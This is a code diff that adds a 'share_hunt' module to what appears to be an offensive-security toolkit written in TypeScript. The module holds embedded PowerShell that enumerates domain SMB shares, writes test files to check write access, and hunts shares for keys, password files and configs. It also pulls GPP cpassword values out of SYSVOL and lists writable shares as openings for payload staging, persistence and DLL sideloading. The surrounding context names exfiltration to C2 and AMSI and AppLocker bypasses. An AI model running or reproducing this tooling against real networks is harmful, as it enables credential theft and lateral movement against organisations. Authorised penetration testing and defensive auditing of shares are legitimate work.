@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  share_hunt: {
+    description:
+      "Network share hunting — discover and enumerate SMB shares across the network, scan for sensitive files (credentials, configs, backups, scripts, databases, SSH keys, certificates), identify open/readable/writable shares, find password files in SYSVOL/NETLOGON/IT shares, detect misconfigured share permissions. Targets: specific host, subnet, or domain computers via AD query",
+    args: "--action enum|hunt|sysvol|writable [--target HOST|SUBNET|domain] [--depth 1-3] [--pattern GLOB]",
+  },
   data_exfil: {
     description:
       "Data exfiltration toolkit — stage and exfiltrate data through multiple channels. DNS exfiltration (encode data in DNS queries to attacker-controlled domain), HTTPS exfiltration (POST data to C2 endpoint), SMB staging (copy files to attacker share), ICMP tunneling (hide data in ICMP echo payloads), and local staging (compress and encrypt files for manual extraction). Includes file discovery for sensitive data targeting",
@@ -13880,6 +13885,395 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function shareHunt(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const target = argVal(args, "--target") || "domain"
+  const depth = argVal(args, "--depth") || "1"
+  const pattern = argVal(args, "--pattern")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Network share hunting...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Network Share Enumeration ==="
+Write-Output ""
+
+$targets = @()
+if ('${target}' -eq 'domain') {
+    Write-Output "[*] Querying AD for domain computers..."
+    try {
+        $searcher = New-Object DirectoryServices.DirectorySearcher
+        $searcher.Filter = '(&(objectCategory=computer)(operatingSystem=*server*))'
+        $searcher.PropertiesToLoad.Add('dnshostname') | Out-Null
+        $searcher.PropertiesToLoad.Add('operatingsystem') | Out-Null
+        $searcher.PageSize = 200
+        $results = $searcher.FindAll()
+        foreach ($r in $results) {
+            $hostname = $r.Properties['dnshostname'][0]
+            if ($hostname) { $targets += $hostname }
+        }
+        Write-Output "[*] Found $($targets.Count) servers in domain"
+
+        if ($targets.Count -eq 0) {
+            $searcher.Filter = '(objectCategory=computer)'
+            $results = $searcher.FindAll()
+            foreach ($r in $results | Select-Object -First 50) {
+                $hostname = $r.Properties['dnshostname'][0]
+                if ($hostname) { $targets += $hostname }
+            }
+            Write-Output "[*] Fallback: found $($targets.Count) computers"
+        }
+    } catch {
+        Write-Output "[-] AD query failed: $($_.Exception.Message)"
+        Write-Output "[*] Trying net view..."
+        $netview = net view 2>&1
+        $targets = $netview | Where-Object { $_ -match '\\\\\\\\(\\S+)' } | ForEach-Object { $Matches[1] }
+        Write-Output "[*] Found $($targets.Count) hosts via net view"
+    }
+} elseif ('${target}' -match '/') {
+    Write-Output "[*] Scanning subnet: ${target}"
+    $base = '${target}'.Split('/')[0].Split('.')[0..2] -join '.'
+    1..254 | ForEach-Object {
+        $ip = "$base.$_"
+        if (Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1) { $targets += $ip }
+    }
+    Write-Output "[*] Found $($targets.Count) live hosts"
+} else {
+    $targets = @('${target}')
+}
+
+Write-Output ""
+$allShares = @()
+
+foreach ($host_ in $targets | Select-Object -First 30) {
+    try {
+        $shares = Get-WmiObject Win32_Share -ComputerName $host_ -ErrorAction Stop | Where-Object { $_.Name -notmatch '\\$$' }
+        if ($shares) {
+            Write-Output "[+] $host_"
+            foreach ($s in $shares) {
+                $unc = "\\\\$host_\\$($s.Name)"
+                $readable = Test-Path $unc -ErrorAction SilentlyContinue
+                $writable = $false
+                if ($readable) {
+                    try {
+                        $testFile = "$unc\\.cs-test-$(Get-Random)"
+                        [IO.File]::WriteAllText($testFile, '')
+                        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
+                        $writable = $true
+                    } catch {}
+                }
+                $access = if ($writable) { 'READ/WRITE' } elseif ($readable) { 'READ' } else { 'NO ACCESS' }
+                Write-Output "    [$access] $($s.Name) — $($s.Description) ($($s.Path))"
+                $allShares += [PSCustomObject]@{ Host = $host_; Share = $s.Name; UNC = $unc; Access = $access }
+            }
+        }
+    } catch {
+        Write-Output "[-] $host_ — access denied or offline"
+    }
+}
+
+Write-Output ""
+$writableShares = $allShares | Where-Object { $_.Access -eq 'READ/WRITE' }
+$readableShares = $allShares | Where-Object { $_.Access -eq 'READ' }
+Write-Output "=== Summary ==="
+Write-Output "[*] Total shares: $($allShares.Count)"
+Write-Output "[*] Readable: $($readableShares.Count)"
+Write-Output "[!] Writable: $($writableShares.Count)"
+if ($writableShares) {
+    Write-Output ""
+    Write-Output "[!] WRITABLE SHARES (high-value for staging/persistence):"
+    foreach ($w in $writableShares) { Write-Output "    $($w.UNC)" }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-SHARE-001",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: `smb://${target}`,
+      title: "Network shares enumerated with access level assessment",
+      details: r.stdout.substring(0, 500),
+      remediation: "Restrict share permissions. Remove world-readable/writable shares. Audit share ACLs regularly.",
+    })
+  }
+
+  if (action === "hunt") {
+    const targetHost = target === "domain" ? "." : target
+    const maxDepth = depth
+    const extraPattern = pattern ? `,'${pattern}'` : ""
+    const script = `
+Write-Output "=== Sensitive File Hunt on Shares ==="
+Write-Output ""
+
+$sensitivePatterns = @(
+    '*.kdbx','*.key','*.pem','*.pfx','*.p12','*.cer','*.crt',
+    'id_rsa*','*.ppk','*.rdp',
+    'web.config','appsettings*.json','*.env','.env*',
+    '*password*','*credential*','*secret*','*cred*',
+    'unattend*.xml','sysprep*.xml','Groups.xml','ScheduledTasks.xml',
+    '*.sql','*.bak','*.mdb','*.accdb',
+    '*.ps1','*.bat','*.cmd','*.vbs',
+    '*.conf','*.cfg','*.ini','*.yml','*.yaml',
+    'wp-config.php','config.php','database.yml','secrets.yml'${extraPattern}
+)
+
+$targets = @()
+if ('${targetHost}' -eq '.') {
+    $shares = Get-WmiObject Win32_Share -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\\$$' }
+    foreach ($s in $shares) { $targets += $s.Path }
+    Write-Output "[*] Scanning local shares: $($targets.Count)"
+} else {
+    $shares = Get-WmiObject Win32_Share -ComputerName '${targetHost}' -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\\$$' }
+    foreach ($s in $shares) { $targets += "\\\\${targetHost}\\$($s.Name)" }
+    Write-Output "[*] Scanning remote shares on ${targetHost}: $($targets.Count)"
+}
+
+$totalFinds = @()
+
+foreach ($sharePath in $targets) {
+    Write-Output ""
+    Write-Output "[*] Scanning: $sharePath (depth: ${maxDepth})"
+
+    foreach ($pat in $sensitivePatterns) {
+        try {
+            $found = Get-ChildItem $sharePath -Filter $pat -Recurse -File -Depth ${maxDepth} -ErrorAction SilentlyContinue | Select-Object -First 10
+            foreach ($f in $found) {
+                $sizeKB = [math]::Round($f.Length/1KB, 1)
+                $category = switch -Regex ($f.Name) {
+                    '\\.(kdbx|key|pem|pfx|p12|ppk)$' { 'CREDENTIAL/KEY' }
+                    'password|credential|secret|cred' { 'PASSWORD FILE' }
+                    '\\.(sql|bak|mdb|accdb)$' { 'DATABASE' }
+                    'Groups\\.xml|ScheduledTasks\\.xml|unattend|sysprep' { 'GPP/SYSPREP' }
+                    'web\\.config|appsettings|config\\.php|wp-config' { 'APP CONFIG' }
+                    '\\.env' { 'ENV FILE' }
+                    '\\.(ps1|bat|cmd|vbs)$' { 'SCRIPT' }
+                    '\\.(rdp)$' { 'RDP FILE' }
+                    default { 'CONFIG' }
+                }
+                Write-Output "    [!] [$category] $($f.FullName) ($sizeKB KB)"
+                $totalFinds += [PSCustomObject]@{ Category = $category; Path = $f.FullName; Size = $f.Length }
+            }
+        } catch {}
+    }
+}
+
+Write-Output ""
+Write-Output "=== Hunt Summary ==="
+Write-Output "[*] Total sensitive files: $($totalFinds.Count)"
+$grouped = $totalFinds | Group-Object Category | Sort-Object Count -Descending
+foreach ($g in $grouped) {
+    Write-Output "    $($g.Name): $($g.Count) files"
+}
+
+$gppFiles = $totalFinds | Where-Object { $_.Category -eq 'GPP/SYSPREP' }
+if ($gppFiles) {
+    Write-Output ""
+    Write-Output "[!!!] GPP/SYSPREP FILES FOUND — may contain cleartext passwords!"
+    Write-Output "[*] Use: gpp-decrypt to extract cPassword values from Groups.xml"
+}
+
+$keyFiles = $totalFinds | Where-Object { $_.Category -eq 'CREDENTIAL/KEY' }
+if ($keyFiles) {
+    Write-Output ""
+    Write-Output "[!!!] CREDENTIAL/KEY FILES FOUND — SSH keys, certificates, KeePass databases!"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-SHARE-002",
+      provider: "windows",
+      severity: r.stdout.includes("!!!") ? "critical" : "medium",
+      status: "ENUMERATED",
+      resource: `smb://${targetHost}/hunt`,
+      title: "Sensitive file hunt across network shares",
+      details: r.stdout.substring(0, 500),
+      remediation: "Remove sensitive files from shares. Encrypt credentials. Audit share contents regularly.",
+    })
+  }
+
+  if (action === "sysvol") {
+    const script = `
+Write-Output "=== SYSVOL / NETLOGON Credential Hunt ==="
+Write-Output ""
+
+$domain = (Get-WmiObject Win32_ComputerSystem).Domain
+$dc = $env:LOGONSERVER -replace '\\\\',''
+$sysvolPath = "\\\\$domain\\SYSVOL\\$domain"
+$netlogonPath = "\\\\$domain\\NETLOGON"
+
+Write-Output "[*] Domain: $domain"
+Write-Output "[*] DC: $dc"
+Write-Output "[*] SYSVOL: $sysvolPath"
+Write-Output "[*] NETLOGON: $netlogonPath"
+Write-Output ""
+
+$credFinds = @()
+
+Write-Output "=== Groups.xml (GPP Passwords) ==="
+$gppFiles = Get-ChildItem $sysvolPath -Filter "Groups.xml" -Recurse -ErrorAction SilentlyContinue
+foreach ($gpp in $gppFiles) {
+    Write-Output "[!!!] $($gpp.FullName)"
+    $content = Get-Content $gpp.FullName -ErrorAction SilentlyContinue
+    $cpassword = $content | Select-String 'cpassword="([^"]+)"' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
+    $username = $content | Select-String 'userName="([^"]+)"' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
+    if ($cpassword) {
+        Write-Output "    [!] cPassword FOUND: $cpassword"
+        Write-Output "    [!] Username: $username"
+        Write-Output "    [*] Decrypt with: gpp-decrypt '$cpassword'"
+        $credFinds += "GPP:$username"
+    }
+}
+
+Write-Output ""
+Write-Output "=== ScheduledTasks.xml ==="
+$taskFiles = Get-ChildItem $sysvolPath -Filter "ScheduledTasks.xml" -Recurse -ErrorAction SilentlyContinue
+foreach ($tf in $taskFiles) {
+    Write-Output "[!] $($tf.FullName)"
+    $content = Get-Content $tf.FullName -ErrorAction SilentlyContinue
+    if ($content -match 'cpassword') { Write-Output "    [!!!] Contains cPassword!" }
+}
+
+Write-Output ""
+Write-Output "=== Scripts in SYSVOL/NETLOGON ==="
+$scripts = @()
+$scripts += Get-ChildItem $sysvolPath -Include '*.ps1','*.bat','*.cmd','*.vbs','*.wsf' -Recurse -ErrorAction SilentlyContinue
+$scripts += Get-ChildItem $netlogonPath -Include '*.ps1','*.bat','*.cmd','*.vbs','*.wsf' -Recurse -ErrorAction SilentlyContinue
+
+foreach ($s in $scripts | Select-Object -First 30) {
+    Write-Output "[*] $($s.FullName)"
+    $content = Get-Content $s.FullName -Raw -ErrorAction SilentlyContinue
+    if ($content -match 'password|passwd|pwd|credential|secret|apikey|token') {
+        Write-Output "    [!!!] Contains credential keywords!"
+        $matches_ = $content | Select-String '(?i)(password|passwd|pwd|secret|apikey|token)\s*[=:]\s*[''"]?([^\s''"]+)' -AllMatches
+        foreach ($m in $matches_.Matches | Select-Object -First 5) {
+            Write-Output "    [!] $($m.Value)"
+        }
+        $credFinds += "Script:$($s.Name)"
+    }
+}
+
+Write-Output ""
+Write-Output "=== INI / XML / Config Files ==="
+$configs = Get-ChildItem $sysvolPath -Include '*.ini','*.xml','*.conf','*.cfg' -Recurse -ErrorAction SilentlyContinue |
+    Where-Object { $_.Name -notmatch 'Groups\\.xml|ScheduledTasks\\.xml|Registry\\.xml' }
+foreach ($c in $configs | Select-Object -First 20) {
+    $content = Get-Content $c.FullName -Raw -ErrorAction SilentlyContinue
+    if ($content -match 'password|passwd|credential|secret') {
+        Write-Output "[!] $($c.FullName) — contains credential keywords"
+        $credFinds += "Config:$($c.Name)"
+    }
+}
+
+Write-Output ""
+Write-Output "=== Summary ==="
+Write-Output "[*] GPP files found: $($gppFiles.Count)"
+Write-Output "[*] Scripts found: $($scripts.Count)"
+Write-Output "[*] Credential findings: $($credFinds.Count)"
+if ($credFinds.Count -gt 0) {
+    Write-Output ""
+    Write-Output "[!!!] CREDENTIALS FOUND IN SYSVOL — IMMEDIATE WIN"
+    foreach ($cf in $credFinds) { Write-Output "    $cf" }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-SHARE-003",
+      provider: "windows",
+      severity: r.stdout.includes("CREDENTIALS FOUND") ? "critical" : "medium",
+      status: r.stdout.includes("CREDENTIALS FOUND") ? "VULNERABLE" : "CHECKED",
+      resource: `smb://SYSVOL`,
+      title: "SYSVOL/NETLOGON credential hunt — GPP passwords, scripts, configs",
+      details: r.stdout.substring(0, 500),
+      remediation: "Delete Groups.xml with cPassword. Remove plaintext credentials from SYSVOL scripts. Apply MS14-025 patch.",
+    })
+  }
+
+  if (action === "writable") {
+    const script = `
+Write-Output "=== Writable Share Discovery ==="
+Write-Output "[*] Finding writable shares for staging and persistence..."
+Write-Output ""
+
+$targets = @()
+try {
+    $searcher = New-Object DirectoryServices.DirectorySearcher
+    $searcher.Filter = '(objectCategory=computer)'
+    $searcher.PropertiesToLoad.Add('dnshostname') | Out-Null
+    $searcher.PageSize = 200
+    $results = $searcher.FindAll()
+    foreach ($r in $results | Select-Object -First 50) {
+        $hostname = $r.Properties['dnshostname'][0]
+        if ($hostname) { $targets += $hostname }
+    }
+} catch {
+    $targets = @($env:LOGONSERVER -replace '\\\\','')
+}
+
+Write-Output "[*] Checking $($targets.Count) hosts..."
+Write-Output ""
+
+$writableShares = @()
+
+foreach ($host_ in $targets) {
+    try {
+        $shares = net view "\\\\$host_" 2>&1 | Where-Object { $_ -match '^(\\S+)\\s+Disk' }
+        foreach ($line in $shares) {
+            $shareName = ($line -split '\\s+')[0]
+            $unc = "\\\\$host_\\$shareName"
+            try {
+                $testFile = "$unc\\.cs-write-test-$(Get-Random)"
+                [IO.File]::WriteAllText($testFile, 'test')
+                Remove-Item $testFile -Force -ErrorAction SilentlyContinue
+                $fileCount = (Get-ChildItem $unc -ErrorAction SilentlyContinue | Measure-Object).Count
+                Write-Output "[+] WRITABLE: $unc ($fileCount items)"
+                $writableShares += [PSCustomObject]@{ UNC = $unc; Items = $fileCount }
+            } catch {}
+        }
+    } catch {}
+}
+
+Write-Output ""
+Write-Output "=== Writable Share Summary ==="
+Write-Output "[*] Total writable: $($writableShares.Count)"
+
+if ($writableShares) {
+    Write-Output ""
+    Write-Output "[*] Attack opportunities:"
+    Write-Output "    1. Stage payloads for lateral movement"
+    Write-Output "    2. Drop SCF/URL files for hash capture (Responder)"
+    Write-Output "    3. Replace scripts for persistence"
+    Write-Output "    4. Plant DLLs for sideloading on remote hosts"
+    Write-Output ""
+    foreach ($w in $writableShares) {
+        Write-Output "    $($w.UNC) — $($w.Items) items"
+    }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-SHARE-004",
+      provider: "windows",
+      severity: r.stdout.includes("WRITABLE:") ? "high" : "info",
+      status: r.stdout.includes("WRITABLE:") ? "VULNERABLE" : "CHECKED",
+      resource: "smb://writable-shares",
+      title: "Writable share discovery for staging and persistence",
+      details: r.stdout.substring(0, 500),
+      remediation: "Restrict write access on shares. Use NTFS + share-level permissions. Monitor for unexpected file drops.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function dataExfil(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "discover"
   const target = argVal(args, "--target")
@@ -19519,6 +19913,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  share_hunt: shareHunt,
   data_exfil: dataExfil,
   firewall_manage: firewallManage,
   local_recon: localRecon,
